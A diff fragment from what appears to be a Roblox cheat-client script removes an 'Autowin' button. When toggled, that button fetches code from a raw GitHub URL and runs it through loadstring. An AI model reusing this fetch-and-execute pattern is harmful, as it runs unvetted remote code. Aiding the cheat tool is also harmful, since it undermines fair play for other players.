@@ -10366,19 +10366,6 @@ task.spawn(function()
 	end
 end)
 
-runFunction(Function()
-    local Autowin = {["Enabled"] = false}
-    Autowin = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
-        ["Name"] = "Autowin",
-        ["HoverText"] = "death tp autowin",
-        ["Function"] = function(callback)
-            if callback then
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisAccIsNotHere/Autotroll/main/TrolledAutowim", true))()
-            end
-	  end
-    })
-end)
-
 GuiLibrary.RemoveObject("PanicOptionsButton")
 GuiLibrary.RemoveObject("MissileTPOptionsButton")
 GuiLibrary.RemoveObject("SwimOptionsButton")
